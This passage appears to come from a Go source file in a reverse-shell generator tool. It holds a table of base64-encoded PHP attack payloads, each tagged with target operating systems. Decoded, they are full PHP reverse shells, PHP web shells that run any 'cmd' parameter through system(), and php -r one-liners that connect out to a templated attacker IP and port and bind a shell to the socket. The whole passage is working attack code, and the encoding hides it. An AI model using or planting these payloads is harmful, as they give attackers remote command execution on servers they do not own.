HIsIDMwKTsKaWYgKCEkc29jaykgewoJcHJpbnRpdCgiJGVycnN0ciAoJGVycm5vKSIpOwoJZXhpdCgxKTsKfQoKJGRlc2NyaXB0b3JzcGVjID0gYXJyYXkoCiAgIDAgPT4gYXJyYXkoInBpcGUiLCAiciIpLCAgLy8gc3RkaW4gaXMgYSBwaXBlIHRoYXQgdGhlIGNoaWxkIHdpbGwgcmVhZCBmcm9tCiAgIDEgPT4gYXJyYXkoInBpcGUiLCAidyIpLCAgLy8gc3Rkb3V0IGlzIGEgcGlwZSB0aGF0IHRoZSBjaGlsZCB3aWxsIHdyaXRlIHRvCiAgIDIgPT4gYXJyYXkoInBpcGUiLCAidyIpICAgLy8gc3RkZXJyIGlzIGEgcGlwZSB0aGF0IHRoZSBjaGlsZCB3aWxsIHdyaXRlIHRvCik7CgokcHJvY2VzcyA9IHByb2Nfb3Blbigkc2hlbGwsICRkZXNjcmlwdG9yc3BlYywgJHBpcGVzKTsKCmlmICghaXNfcmVzb3VyY2UoJHByb2Nlc3MpKSB7CglwcmludGl0KCJFUlJPUjogQ2FuJ3Qgc3Bhd24gc2hlbGwiKTsKCWV4aXQoMSk7Cn0KCnN0cmVhbV9zZXRfYmxvY2tpbmcoJHBpcGVzWzBdLCAwKTsKc3RyZWFtX3NldF9ibG9ja2luZygkcGlwZXNbMV0sIDApOwpzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBlc1syXSwgMCk7CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHNvY2ssIDApOwoKcHJpbnRpdCgiU3VjY2Vzc2Z1bGx5IG9wZW5lZCByZXZlcnNlIHNoZWxsIHRvICRpcDokcG9ydCIpOwoKd2hpbGUgKDEpIHsKCWlmIChmZW9mKCRzb2NrKSkgewoJCXByaW50aXQoIkVSUk9SOiBTaGVsbCBjb25uZWN0aW9uIHRlcm1pbmF0ZWQiKTsKCQlicmVhazsKCX0KCglpZiAoZmVvZigkcGlwZXNbMV0pKSB7CgkJcHJpbnRpdCgiRVJST1I6IFNoZWxsIHByb2Nlc3MgdGVybWluYXRlZCIpOwoJCWJyZWFrOwoJfQoKCSRyZWFkX2EgPSBhcnJheSgkc29jaywgJHBpcGVzWzFdLCAkcGlwZXNbMl0pOwoJJG51bV9jaGFuZ2VkX3NvY2tldHMgPSBzdHJlYW1fc2VsZWN0KCRyZWFkX2EsICR3cml0ZV9hLCAkZXJyb3JfYSwgbnVsbCk7CgoJaWYgKGluX2FycmF5KCRzb2NrLCAkcmVhZF9hKSkgewoJCWlmICgkZGVidWcpIHByaW50aXQoIlNPQ0sgUkVBRCIpOwoJCSRpbnB1dCA9IGZyZWFkKCRzb2NrLCAkY2h1bmtfc2l6ZSk7CgkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU09DSzogJGlucHV0Iik7CgkJZndyaXRlKCRwaXBlc1swXSwgJGlucHV0KTsKCX0KCglpZiAoaW5fYXJyYXkoJHBpcGVzWzFdLCAkcmVhZF9hKSkgewoJCWlmICgkZGVidWcpIHByaW50aXQoIlNURE9VVCBSRUFEIik7CgkJJGlucHV0ID0gZnJlYWQoJHBpcGVzWzFdLCAkY2h1bmtfc2l6ZSk7CgkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU1RET1VUOiAkaW5wdXQiKTsKCQlmd3JpdGUoJHNvY2ssICRpbnB1dCk7Cgl9CgoJaWYgKGluX2FycmF5KCRwaXBlc1syXSwgJHJlYWRfYSkpIHsKCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTVERFUlIgUkVBRCIpOwoJCSRpbnB1dCA9IGZyZWFkKCRwaXBlc1syXSwgJGNodW5rX3NpemUpOwoJCWlmICgkZGVidWcpIHByaW50aXQoIlNUREVSUjogJGlucHV0Iik7CgkJZndyaXRlKCRzb2NrLCAkaW5wdXQpOwoJfQp9CgpmY2xvc2UoJHNvY2spOwpmY2xvc2UoJHBpcGVzWzBdKTsKZmNsb3NlKCRwaXBlc1sxXSk7CmZjbG9zZSgkcGlwZXNbMl0pOwpwcm9jX2Nsb3NlKCRwcm9jZXNzKTsKCmZ1bmN0aW9uIHByaW50aXQgKCRzdHJpbmcpIHsKCWlmICghJGRhZW1vbikgewoJCXByaW50ICIkc3RyaW5nXG4iOwoJfQp9Cgo/Pg==",
		[]string{"linux", "windows", "mac"},
	},
	{
		"PHP Ivan Sincek",
		"PD9waHAKLy8gQ29weXJpZ2h0IChjKSAyMDIwIEl2YW4gU2luY2VrCi8vIHYyLjMKLy8gUmVxdWlyZXMgUEhQIHY1LjAuMCBvciBncmVhdGVyLgovLyBXb3JrcyBvbiBMaW51eCBPUywgbWFjT1MsIGFuZCBXaW5kb3dzIE9TLgovLyBTZWUgdGhlIG9yaWdpbmFsIHNjcmlwdCBhdCBodHRwczovL2dpdGh1Yi5jb20vcGVudGVzdG1vbmtleS9waHAtcmV2ZXJzZS1zaGVsbC4KY2xhc3MgU2hlbGwgewogICAgcHJpdmF0ZSAkYWRkciAgPSBudWxsOwogICAgcHJpdmF0ZSAkcG9ydCAgPSBudWxsOwogICAgcHJpdmF0ZSAkb3MgICAgPSBudWxsOwogICAgcHJpdmF0ZSAkc2hlbGwgPSBudWxsOwogICAgcHJpdmF0ZSAkZGVzY3JpcHRvcnNwZWMgPSBhcnJheSgKICAgICAgICAwID0+IGFycmF5KCdwaXBlJywgJ3InKSwgLy8gc2hlbGwgY2FuIHJlYWQgZnJvbSBTVERJTgogICAgICAgIDEgPT4gYXJyYXkoJ3BpcGUnLCAndycpLCAvLyBzaGVsbCBjYW4gd3JpdGUgdG8gU1RET1VUCiAgICAgICAgMiA9PiBhcnJheSgncGlwZScsICd3JykgIC8vIHNoZWxsIGNhbiB3cml0ZSB0byBTVERFUlIKICAgICk7CiAgICBwcml2YXRlICRidWZmZXIgID0gMTAyNDsgICAgLy8gcmVhZC93cml0ZSBidWZmZXIgc2l6ZQogICAgcHJpdmF0ZSAkY2xlbiAgICA9IDA7ICAgICAgIC8vIGNvbW1hbmQgbGVuZ3RoCiAgICBwcml2YXRlICRlcnJvciAgID0gZmFsc2U7ICAgLy8gc3RyZWFtIHJlYWQvd3JpdGUgZXJyb3IKICAgIHB1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkYWRkciwgJHBvcnQpIHsKICAgICAgICAkdGhpcy0+YWRkciA9ICRhZGRyOwogICAgICAgICR0aGlzLT5wb3J0ID0gJHBvcnQ7CiAgICB9CiAgICBwcml2YXRlIGZ1bmN0aW9uIGRldGVjdCgpIHsKICAgICAgICAkZGV0ZWN0ZWQgPSB0cnVlOwogICAgICAgIGlmIChzdHJpcG9zKFBIUF9PUywgJ0xJTlVYJykgIT09IGZhbHNlKSB7IC8vIHNhbWUgZm9yIG1hY09TCiAgICAgICAgICAgICR0aGlzLT5vcyAgICA9ICdMSU5VWCc7CiAgICAgICAgICAgICR0aGlzLT5zaGVsbCA9ICd7ey5TaGVsbH19JzsKICAgICAgICB9IGVsc2UgaWYgKHN0cmlwb3MoUEhQX09TLCAnV0lOMzInKSAhPT0gZmFsc2UgfHwgc3RyaXBvcyhQSFBfT1MsICdXSU5OVCcpICE9PSBmYWxzZSB8fCBzdHJpcG9zKFBIUF9PUywgJ1dJTkRPV1MnKSAhPT0gZmFsc2UpIHsKICAgICAgICAgICAgJHRoaXMtPm9zICAgID0gJ1dJTkRPV1MnOwogICAgICAgICAgICAkdGhpcy0+c2hlbGwgPSAnY21kLmV4ZSc7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJGRldGVjdGVkID0gZmFsc2U7CiAgICAgICAgICAgIGVjaG8gIlNZU19FUlJPUjogVW5kZXJseWluZyBvcGVyYXRpbmcgc3lzdGVtIGlzIG5vdCBzdXBwb3J0ZWQsIHNjcmlwdCB3aWxsIG5vdyBleGl0Li4uXG4iOwogICAgICAgIH0KICAgICAgICByZXR1cm4gJGRldGVjdGVkOwogICAgfQogICAgcHJpdmF0ZSBmdW5jdGlvbiBkYWVtb25pemUoKSB7CiAgICAgICAgJGV4aXQgPSBmYWxzZTsKICAgICAgICBpZiAoIWZ1bmN0aW9uX2V4aXN0cygncGNudGxfZm9yaycpKSB7CiAgICAgICAgICAgIGVjaG8gIkRBRU1PTklaRTogcGNudGxfZm9yaygpIGRvZXMgbm90IGV4aXN0cywgbW92aW5nIG9uLi4uXG4iOwogICAgICAgIH0gZWxzZSBpZiAoKCRwaWQgPSBAcGNudGxfZm9yaygpKSA8IDApIHsKICAgICAgICAgICAgZWNobyAiREFFTU9OSVpFOiBDYW5ub3QgZm9yayBvZmYgdGhlIHBhcmVudCBwcm9jZXNzLCBtb3Zpbmcgb24uLi5cbiI7CiAgICAgICAgfSBlbHNlIGlmICgkcGlkID4gMCkgewogICAgICAgICAgICAkZXhpdCA9IHRydWU7CiAgICAgICAgICAgIGVjaG8gIkRBRU1PTklaRTogQ2hpbGQgcHJvY2VzcyBmb3JrZWQgb2ZmIHN1Y2Nlc3NmdWxseSwgcGFyZW50IHByb2Nlc3Mgd2lsbCBub3cgZXhpdC4uLlxuIjsKICAgICAgICB9IGVsc2UgaWYgKHBvc2l4X3NldHNpZCgpIDwgMCkgewogICAgICAgICAgICAvLyBvbmNlIGRhZW1vbml6ZWQgeW91IHdpbGwgYWN0dWFsbHkgbm8gbG9uZ2VyIHNlZSB0aGUgc2NyaXB0J3MgZHVtcAogICAgICAgICAgICBlY2hvICJEQUVNT05JWkU6IEZvcmtlZCBvZmYgdGhlIHBhcmVudCBwcm9jZXNzIGJ1dCBjYW5ub3Qgc2V0IGEgbmV3IFNJRCwgbW92aW5nIG9uIGFzIGFuIG9ycGhhbi4uLlxuIjsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBlY2hvICJEQUVNT05JWkU6IENvbXBsZXRlZCBzdWNjZXNzZnVsbHkhXG4iOwogICAgICAgIH0KICAgICAgICByZXR1cm4gJGV4aXQ7CiAgICB9CiAgICBwcml2YXRlIGZ1bmN0aW9uIHNldHRpbmdzKCkgewogICAgICAgIEBlcnJvcl9yZXBvcnRpbmcoMCk7CiAgICAgICAgQHNldF90aW1lX2xpbWl0KDApOyAvLyBkbyBub3QgaW1wb3NlIHRoZSBzY3JpcHQgZXhlY3V0aW9uIHRpbWUgbGltaXQKICAgICAgICBAdW1hc2soMCk7IC8vIHNldCB0aGUgZmlsZS9kaXJlY3RvcnkgcGVybWlzc2lvbnMgLSA2NjYgZm9yIGZpbGVzIGFuZCA3NzcgZm9yIGRpcmVjdG9yaWVzCiAgICB9CiAgICBwcml2YXRlIGZ1bmN0aW9uIGR1bXAoJGRhdGEpIHsKICAgICAgICAkZGF0YSA9IHN0cl9yZXBsYWNlKCc8JywgJyZsdDsnLCAkZGF0YSk7CiAgICAgICAgJGRhdGEgPSBzdHJfcmVwbGFjZSgnPicsICcmZ3Q7JywgJGRhdGEpOwogICAgICAgIGVjaG8gJGRhdGE7CiAgICB9CiAgICBwcml2YXRlIGZ1bmN0aW9uIHJlYWQoJHN0cmVhbSwgJG5hbWUsICRidWZmZXIpIHsKICAgICAgICBpZiAoKCRkYXRhID0gQGZyZWFkKCRzdHJlYW0sICRidWZmZXIpKSA9PT0gZmFsc2UpIHsgLy8gc3VwcHJlc3MgYW4gZXJyb3Igd2hlbiByZWFkaW5nIGZyb20gYSBjbG9zZWQgYmxvY2tpbmcgc3RyZWFtCiAgICAgICAgICAgICR0aGlzLT5lcnJvciA9IHRydWU7ICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIHNldCBnbG9iYWwgZXJyb3IgZmxhZwogICAgICAgICAgICBlY2hvICJTVFJNX0VSUk9SOiBDYW5ub3QgcmVhZCBmcm9tICR7bmFtZX0sIHNjcmlwdCB3aWxsIG5vdyBleGl0Li4uXG4iOwogICAgICAgIH0KICAgICAgICByZXR1cm4gJGRhdGE7CiAgICB9CiAgICBwcml2YXRlIGZ1bmN0aW9uIHdyaXRlKCRzdHJlYW0sICRuYW1lLCAkZGF0YSkgewogICAgICAgIGlmICgoJGJ5dGVzID0gQGZ3cml0ZSgkc3RyZWFtLCAkZGF0YSkpID09PSBmYWxzZSkgeyAvLyBzdXBwcmVzcyBhbiBlcnJvciB3aGVuIHdyaXRpbmcgdG8gYSBjbG9zZWQgYmxvY2tpbmcgc3RyZWFtCiAgICAgICAgICAgICR0aGlzLT5lcnJvciA9IHRydWU7ICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIHNldCBnbG9iYWwgZXJyb3IgZmxhZwogICAgICAgICAgICBlY2hvICJTVFJNX0VSUk9SOiBDYW5ub3Qgd3JpdGUgdG8gJHtuYW1lfSwgc2NyaXB0IHdpbGwgbm93IGV4aXQuLi5cbiI7CiAgICAgICAgfQogICAgICAgIHJldHVybiAkYnl0ZXM7CiAgICB9CiAgICAvLyByZWFkL3dyaXRlIG1ldGhvZCBmb3Igbm9uLWJsb2NraW5nIHN0cmVhbXMKICAgIHByaXZhdGUgZnVuY3Rpb24gcncoJGlucHV0LCAkb3V0cHV0LCAkaW5hbWUsICRvbmFtZSkgewogICAgICAgIHdoaWxlICgoJGRhdGEgPSAkdGhpcy0+cmVhZCgkaW5wdXQsICRpbmFtZSwgJHRoaXMtPmJ1ZmZlcikpICYmICR0aGlzLT53cml0ZSgkb3V0cHV0LCAkb25hbWUsICRkYXRhKSkgewogICAgICAgICAgICBpZiAoJHRoaXMtPm9zID09PSAnV0lORE9XUycgJiYgJG9uYW1lID09PSAnU1RESU4nKSB7ICR0aGlzLT5jbGVuICs9IHN0cmxlbigkZGF0YSk7IH0gLy8gY2FsY3VsYXRlIHRoZSBjb21tYW5kIGxlbmd0aAogICAgICAgICAgICAkdGhpcy0+ZHVtcCgkZGF0YSk7IC8vIHNjcmlwdCdzIGR1bXAKICAgICAgICB9CiAgICB9CiAgICAvLyByZWFkL3dyaXRlIG1ldGhvZCBmb3IgYmxvY2tpbmcgc3RyZWFtcyAoZS5nLiBmb3IgU1RET1VUIGFuZCBTVERFUlIgb24gV2luZG93cyBPUykKICAgIC8vIHdlIG11c3QgcmVhZCB0aGUgZXhhY3QgYnl0ZSBsZW5ndGggZnJvbSBhIHN0cmVhbSBhbmQgbm90IGEgc2luZ2xlIGJ5dGUgbW9yZQogICAgcHJpdmF0ZSBmdW5jdGlvbiBicncoJGlucHV0LCAkb3V0cHV0LCAkaW5hbWUsICRvbmFtZSkgewogICAgICAgICRmc3RhdCA9IGZzdGF0KCRpbnB1dCk7CiAgICAgICAgJHNpemUgPSAkZnN0YXRbJ3NpemUnXTsKICAgICAgICBpZiAoJHRoaXMtPm9zID09PSAnV0lORE9XUycgJiYgJGluYW1lID09PSAnU1RET1VUJyAmJiAkdGhpcy0+Y2xlbikgewogICAgICAgICAgICAvLyBmb3Igc29tZSByZWFzb24gV2luZG93cyBPUyBwaXBlcyBTVERJTiBpbnRvIFNURE9VVAogICAgICAgICAgICAvLyB3ZSBkbyBub3QgbGlrZSB0aGF0CiAgICAgICAgICAgIC8vIHdlIG5lZWQgdG8gZGlzY2FyZCB0aGUgZGF0YSBmcm9tIHRoZSBzdHJlYW0KICAgICAgICAgICAgd2hpbGUgKCR0aGlzLT5jbGVuID4gMCAmJiAoJGJ5dGVzID0gJHRoaXMtPmNsZW4gPj0gJHRoaXMtPmJ1ZmZlciA/ICR0aGlzLT5idWZmZXIgOiAkdGhpcy0+Y2xlbikgJiYgJHRoaXMtPnJlYWQoJGlucHV0LCAkaW5hbWUsICRieXRlcykpIHsKICAgICAgICAgICAgICAgICR0aGlzLT5jbGVuIC09ICRieXRlczsKICAgICAgICAgICAgICAgICRzaXplIC09ICRieXRlczsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICB3aGlsZSAoJHNpemUgPiAwICYmICgkYnl0ZXMgPSAkc2l6ZSA+PSAkdGhpcy0+YnVmZmVyID8gJHRoaXMtPmJ1ZmZlciA6ICRzaXplKSAmJiAoJGRhdGEgPSAkdGhpcy0+cmVhZCgkaW5wdXQsICRpbmFtZSwgJGJ5dGVzKSkgJiYgJHRoaXMtPndyaXRlKCRvdXRwdXQsICRvbmFtZSwgJGRhdGEpKSB7CiAgICAgICAgICAgICRzaXplIC09ICRieXRlczsKICAgICAgICAgICAgJHRoaXMtPmR1bXAoJGRhdGEpOyAvLyBzY3JpcHQncyBkdW1wCiAgICAgICAgfQogICAgfQogICAgcHVibGljIGZ1bmN0aW9uIHJ1bigpIHsKICAgICAgICBpZiAoJHRoaXMtPmRldGVjdCgpICYmICEkdGhpcy0+ZGFlbW9uaXplKCkpIHsKICAgICAgICAgICAgJHRoaXMtPnNldHRpbmdzKCk7CgogICAgICAgICAgICAvLyAtLS0tLSBTT0NLRVQgQkVHSU4gLS0tLS0KICAgICAgICAgICAgJHNvY2tldCA9IEBmc29ja29wZW4oJHRoaXMtPmFkZHIsICR0aGlzLT5wb3J0LCAkZXJybm8sICRlcnJzdHIsIDMwKTsKICAgICAgICAgICAgaWYgKCEkc29ja2V0KSB7CiAgICAgICAgICAgICAgICBlY2hvICJTT0NfRVJST1I6IHskZXJybm99OiB7JGVycnN0cn1cbiI7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBzdHJlYW1fc2V0X2Jsb2NraW5nKCRzb2NrZXQsIGZhbHNlKTsgLy8gc2V0IHRoZSBzb2NrZXQgc3RyZWFtIHRvIG5vbi1ibG9ja2luZyBtb2RlIHwgcmV0dXJucyAndHJ1ZScgb24gV2luZG93cyBPUwoKICAgICAgICAgICAgICAgIC8vIC0tLS0tIFNIRUxMIEJFR0lOIC0tLS0tCiAgICAgICAgICAgICAgICAkcHJvY2VzcyA9IEBwcm9jX29wZW4oJHRoaXMtPnNoZWxsLCAkdGhpcy0+ZGVzY3JpcHRvcnNwZWMsICRwaXBlcywgbnVsbCwgbnVsbCk7CiAgICAgICAgICAgICAgICBpZiAoISRwcm9jZXNzKSB7CiAgICAgICAgICAgICAgICAgICAgZWNobyAiUFJPQ19FUlJPUjogQ2Fubm90IHN0YXJ0IHRoZSBzaGVsbFxuIjsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCAoJHBpcGVzIGFzICRwaXBlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHN0cmVhbV9zZXRfYmxvY2tpbmcoJHBpcGUsIGZhbHNlKTsgLy8gc2V0IHRoZSBzaGVsbCBzdHJlYW1zIHRvIG5vbi1ibG9ja2luZyBtb2RlIHwgcmV0dXJucyAnZmFsc2UnIG9uIFdpbmRvd3MgT1MKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIC8vIC0tLS0tIFdPUksgQkVHSU4gLS0tLS0KICAgICAgICAgICAgICAgICAgICAkc3RhdHVzID0gcHJvY19nZXRfc3RhdHVzKCRwcm9jZXNzKTsKICAgICAgICAgICAgICAgICAgICBAZndyaXRlKCRzb2NrZXQsICJTT0NLRVQ6IFNoZWxsIGhhcyBjb25uZWN0ZWQhIFBJRDogIiAuICRzdGF0dXNbJ3BpZCddIC4gIlxuIik7CiAgICAgICAgICAgICAgICAgICAgZG8gewoJCQkJCQkkc3RhdHVzID0gcHJvY19nZXRfc3RhdHVzKCRwcm9jZXNzKTsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGZlb2YoJHNvY2tldCkpIHsgLy8gY2hlY2sgZm9yIGVuZC1vZi1maWxlIG9uIFNPQ0tFVAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAiU09DX0VSUk9SOiBTaGVsbCBjb25uZWN0aW9uIGhhcyBiZWVuIHRlcm1pbmF0ZWRcbiI7IGJyZWFrOwogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKGZlb2YoJHBpcGVzWzFdKSB8fCAhJHN0YXR1c1sncnVubmluZyddKSB7ICAgICAgICAgICAgICAgICAvLyBjaGVjayBmb3IgZW5kLW9mLWZpbGUgb24gU1RET1VUIG9yIGlmIHByb2Nlc3MgaXMgc3RpbGwgcnVubmluZwogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAiUFJPQ19FUlJPUjogU2hlbGwgcHJvY2VzcyBoYXMgYmVlbiB0ZXJtaW5hdGVkXG4iOyAgIGJyZWFrOyAvLyBmZW9mKCkgZG9lcyBub3Qgd29yayB3aXRoIGJsb2NraW5nIHN0cmVhbXMKICAgICAgICAgICAgICAgICAgICAgICAgfSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gdXNlIHByb2NfZ2V0X3N0YXR1cygpIGluc3RlYWQKICAgICAgICAgICAgICAgICAgICAgICAgJHN0cmVhbXMgPSBhcnJheSgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICdyZWFkJyAgID0+IGFycmF5KCRzb2NrZXQsICRwaXBlc1sxXSwgJHBpcGVzWzJdKSwgLy8gU09DS0VUIHwgU1RET1VUIHwgU1RERVJSCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnd3JpdGUnICA9PiBudWxsLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2V4Y2VwdCcgPT4gbnVsbAogICAgICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgICAgICAgICAkbnVtX2NoYW5nZWRfc3RyZWFtcyA9IEBzdHJlYW1fc2VsZWN0KCRzdHJlYW1zWydyZWFkJ10sICRzdHJlYW1zWyd3cml0ZSddLCAkc3RyZWFtc1snZXhjZXB0J10sIDApOyAvLyB3YWl0IGZvciBzdHJlYW0gY2hhbmdlcyB8IHdpbGwgbm90IHdhaXQgb24gV2luZG93cyBPUwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJG51bV9jaGFuZ2VkX3N0cmVhbXMgPT09IGZhbHNlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvICJTVFJNX0VSUk9SOiBzdHJlYW1fc2VsZWN0KCkgZmFpbGVkXG4iOyBicmVhazsKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgkbnVtX2NoYW5nZWRfc3RyZWFtcyA+IDApIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+b3MgPT09ICdMSU5VWCcpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoaW5fYXJyYXkoJHNvY2tldCAgLCAkc3RyZWFtc1sncmVhZCddKSkgeyAkdGhpcy0+cncoJHNvY2tldCAgLCAkcGlwZXNbMF0sICdTT0NLRVQnLCAnU1RESU4nICk7IH0gLy8gcmVhZCBmcm9tIFNPQ0tFVCBhbmQgd3JpdGUgdG8gU1RESU4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoaW5fYXJyYXkoJHBpcGVzWzJdLCAkc3RyZWFtc1sncmVhZCddKSkgeyAkdGhpcy0+cncoJHBpcGVzWzJdLCAkc29ja2V0ICAsICdTVERFUlInLCAnU09DS0VUJyk7IH0gLy8gcmVhZCBmcm9tIFNUREVSUiBhbmQgd3JpdGUgdG8gU09DS0VUCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGluX2FycmF5KCRwaXBlc1sxXSwgJHN0cmVhbXNbJ3JlYWQnXSkpIHsgJHRoaXMtPnJ3KCRwaXBlc1sxXSwgJHNvY2tldCAgLCAnU1RET1VUJywgJ1NPQ0tFVCcpOyB9IC8vIHJlYWQgZnJvbSBTVERPVVQgYW5kIHdyaXRlIHRvIFNPQ0tFVAogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgkdGhpcy0+b3MgPT09ICdXSU5ET1dTJykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIG9yZGVyIGlzIGltcG9ydGFudAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChpbl9hcnJheSgkc29ja2V0LCAkc3RyZWFtc1sncmVhZCddKS8qLS0tLS0tKi8pIHsgJHRoaXMtPnJ3ICgkc29ja2V0ICAsICRwaXBlc1swXSwgJ1NPQ0tFVCcsICdTVERJTicgKTsgfSAvLyByZWFkIGZyb20gU09DS0VUIGFuZCB3cml0ZSB0byBTVERJTgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoJGZzdGF0ID0gZnN0YXQoJHBpcGVzWzJdKSkgJiYgJGZzdGF0WydzaXplJ10pIHsgJHRoaXMtPmJydygkcGlwZXNbMl0sICRzb2NrZXQgICwgJ1NUREVSUicsICdTT0NLRVQnKTsgfSAvLyByZWFkIGZyb20gU1RERVJSIGFuZCB3cml0ZSB0byBTT0NLRVQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoKCRmc3RhdCA9IGZzdGF0KCRwaXBlc1sxXSkpICYmICRmc3RhdFsnc2l6ZSddKSB7ICR0aGlzLT5icncoJHBpcGVzWzFdLCAkc29ja2V0ICAsICdTVERPVVQnLCAnU09DS0VUJyk7IH0gLy8gcmVhZCBmcm9tIFNURE9VVCBhbmQgd3JpdGUgdG8gU09DS0VUCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9IHdoaWxlICghJHRoaXMtPmVycm9yKTsKICAgICAgICAgICAgICAgICAgICAvLyAtLS0tLS0gV09SSyBFTkQgLS0tLS0tCgogICAgICAgICAgICAgICAgICAgIGZvcmVhY2ggKCRwaXBlcyBhcyAkcGlwZSkgewogICAgICAgICAgICAgICAgICAgICAgICBmY2xvc2UoJHBpcGUpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBwcm9jX2Nsb3NlKCRwcm9jZXNzKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIC8vIC0tLS0tLSBTSEVMTCBFTkQgLS0tLS0tCgogICAgICAgICAgICAgICAgZmNsb3NlKCRzb2NrZXQpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIC8vIC0tLS0tLSBTT0NLRVQgRU5EIC0tLS0tLQoKICAgICAgICB9CiAgICB9Cn0KZWNobyAnPHByZT4nOwovLyBjaGFuZ2UgdGhlIGhvc3QgYWRkcmVzcyBhbmQvb3IgcG9ydCBudW1iZXIgYXMgbmVjZXNzYXJ5CiRzaCA9IG5ldyBTaGVsbCgne3suSXB9fScsIHt7LlBvcnR9fSk7CiRzaC0+cnVuKCk7CnVuc2V0KCRzaCk7Ci8vIGdhcmJhZ2UgY29sbGVjdG9yIHJlcXVpcmVzIFBIUCB2NS4zLjAgb3IgZ3JlYXRlcgovLyBAZ2NfY29sbGVjdF9jeWNsZXMoKTsKZWNobyAnPC9wcmU+JzsKPz4=",
		[]string{"linux", "windows", "mac"},
	},
	{
		"PHP cmd",
		"PGh0bWw+Cjxib2R5Pgo8Zm9ybSBtZXRob2Q9IkdFVCIgbmFtZT0iPD9waHAgZWNobyBiYXNlbmFtZSgkX1NFUlZFUlsnUEhQX1NFTEYnXSk7ID8+Ij4KPGlucHV0IHR5cGU9IlRFWFQiIG5hbWU9ImNtZCIgaWQ9ImNtZCIgc2l6ZT0iODAiPgo8aW5wdXQgdHlwZT0iU1VCTUlUIiB2YWx1ZT0iRXhlY3V0ZSI+CjwvZm9ybT4KPHByZT4KPD9waHAKICAgIGlmKGlzc2V0KCRfR0VUWydjbWQnXSkpCiAgICB7CiAgICAgICAgc3lzdGVtKCRfR0VUWydjbWQnXSk7CiAgICB9Cj8+CjwvcHJlPgo8L2JvZHk+CjxzY3JpcHQ+ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImNtZCIpLmZvY3VzKCk7PC9zY3JpcHQ+CjwvaHRtbD4=",
		[]string{"linux", "windows", "mac"},
	},
	{
		"PHP cmd 2",
		"PD9waHAgaWYoaXNzZXQoJF9SRVFVRVNUWyJjbWQiXSkpeyBlY2hvICI8cHJlPiI7ICRjbWQgPSAoJF9SRVFVRVNUWyJjbWQiXSk7IHN5c3RlbSgkY21kKTsgZWNobyAiPC9wcmU+IjsgZGllOyB9Pz4=",
		[]string{"linux", "windows", "mac"},
	},
	{
		"PHP cmd small",
		"PD89YCRfR0VUWzBdYD8+",
		[]string{"linux", "windows", "mac"},
	},
	{
		"PHP exec",
		"cGhwIC1yICckc29jaz1mc29ja29wZW4oInt7LklwfX0iLHt7LlBvcnR9fSk7ZXhlYygie3suU2hlbGx9fSA8JjMgPiYzIDI+JjMiKTsn",
		[]string{"linux", "mac"},
	},
	{
		"PHP shell_exec",
		"cGhwIC1yICckc29jaz1mc29ja29wZW4oInt7LklwfX0iLHt7LlBvcnR9fSk7c2hlbGxfZXhlYygie3suU2hlbGx9fSA8JjMgPiYzIDI+JjMiKTsn",
		[]string{"linux", "mac"},
	},
	{
		"PHP system",
		"cGhwIC1yICckc29jaz1mc29ja29wZW4oInt7LklwfX0iLHt7LlBvcnR9fSk7c3lzdGVtKCJ7ey5TaGVsbH19IDwmMyA+JjMgMj4mMyIpOyc=",
		[]string{"linux", "windows", "mac"},
	},
	{
		"PHP passthru",
		"cGhwIC1yICckc29jaz1mc29ja29wZW4oInt7LklwfX0iLHt7LlBvcnR9fSk7cGFzc3RocnUoInt7LlNoZWxsfX0gPCYzID4mMyAyPiYzIik7Jw==",
		[]string{"linux", "mac"},
	},
	{
		"PHP `",
		"cGhwIC1yICckc29jaz1mc29ja29wZW4oInt7LklwfX0iLHt7LlBvcnR9fSk7YHt7LlNoZWxsfX0gPCYzID4mMyAyPiYzYDsn",
		[]string{"linux", "windows", "mac"},
	},
	{
		"PHP popen",
